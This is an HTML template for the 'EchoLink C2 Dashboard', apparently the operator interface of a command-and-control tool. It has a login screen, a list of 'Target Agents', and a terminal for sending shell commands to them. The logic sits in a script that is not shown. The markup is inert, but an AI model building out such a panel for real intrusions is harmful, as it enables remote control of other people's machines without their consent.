<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>EchoLink C2 Dashboard</title>
    <link rel="stylesheet" href="/static/css/style.css">
</head>
<body>
    <div id="login-screen">
        <div class="login-box">
            <h2 style="border-bottom: none;">EchoLink Login</h2>
            <input type="text" id="login-user" placeholder="Username" autocomplete="off">
            <input type="password" id="login-pass" placeholder="Password">
            <button id="login-btn">Authenticate</button>
            <div id="login-error"></div>
        </div>
    </div>
    
    <div id="sidebar">
        <h2>Target Agents</h2>
        <div id="agent-list">
            </div>
    </div>

    <div id="main">
        <h2 id="current-agent">Select an Agent to proceed...</h2>
        <div id="terminal">
            </div>
        <div id="input-area">
            <input type="text" id="cmd-input" placeholder="Enter shell command..." disabled autocomplete="off">
            <button id="send-btn" disabled>Execute</button>
        </div>
    </div>

    <script src="/static/js/main.js"></script>
</body>
</html>
